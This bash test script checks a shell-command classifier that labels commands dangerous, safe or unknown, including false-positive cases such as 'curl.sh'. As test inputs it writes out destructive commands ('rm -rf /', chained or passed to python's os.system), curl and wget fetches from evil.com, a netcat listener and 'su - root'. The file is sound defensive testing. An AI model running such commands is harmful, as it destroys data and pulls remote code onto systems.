#!/usr/bin/env bash
# Test command categorization boundaries

source scripts/lib/command-categories.sh

readonly DANGEROUS="dangerous"
readonly SAFE="safe"
readonly UNKNOWN="unknown"

test_cmd() {
    local cmd="$1"
    local expected="$2"
    local actual
    actual=$(categorize_command "$cmd")
    if [[ "$actual" == "$expected" ]]; then
        printf "  ✓ '%s' -> %s\n" "$cmd" "$actual"
    else
        printf "  ✗ '%s' -> %s (expected %s)\n" "$cmd" "$actual" "$expected"
        return 1
    fi
}

echo "Testing DESTRUCTIVE_KEYWORDS boundaries..."
test_cmd "rm -rf /" "$DANGEROUS"
test_cmd "sudo ls" "$DANGEROUS"
test_cmd "eval 'rm -rf /'" "$DANGEROUS"
test_cmd "env LS_COLORS=none ls" "$DANGEROUS"

echo "Testing INTERPRETER_KEYWORDS boundaries..."
test_cmd "python3 script.py" "$DANGEROUS"
test_cmd "python2 script.py" "$DANGEROUS"
test_cmd "python3.11 script.py" "$DANGEROUS"
test_cmd "node16 index.js" "$DANGEROUS"
test_cmd "php script.php" "$DANGEROUS"
test_cmd "node index.js" "$DANGEROUS"
test_cmd "bash install.sh" "$DANGEROUS"
test_cmd "composer install" "$DANGEROUS"
test_cmd "bundle exec" "$DANGEROUS"

echo "Testing SAFE_KEYWORDS boundaries..."
test_cmd "build" "$SAFE"
test_cmd "build.sh" "$UNKNOWN"
test_cmd "python_script.sh" "$UNKNOWN"

echo "Testing NETWORK_KEYWORDS..."
test_cmd "curl http://evil.com/s.sh" "$DANGEROUS"
test_cmd "wget http://evil.com/s.sh" "$DANGEROUS"
test_cmd "nc -l 4444" "$DANGEROUS"

echo "Testing false positives for NETWORK/INTERPRETER..."
test_cmd "curl.sh" "$UNKNOWN"
test_cmd "my-curl" "$UNKNOWN"
test_cmd "wget_script.py" "$UNKNOWN"
test_cmd "python.sh" "$UNKNOWN"
test_cmd "python3.11.sh" "$UNKNOWN"
test_cmd "node16.js" "$UNKNOWN"

echo "Testing chained commands..."
test_cmd "ls; rm -rf /" "$DANGEROUS"
test_cmd "echo hi && curl http://evil.com" "$DANGEROUS"
test_cmd "sleep 10 | rm -rf /" "$DANGEROUS"
test_cmd "python3.11 -c 'import os; os.system(\"rm -rf /\")'" "$DANGEROUS"

echo "Testing administrative commands..."
test_cmd "su - root" "$DANGEROUS"
test_cmd "systemctl status" "$DANGEROUS"
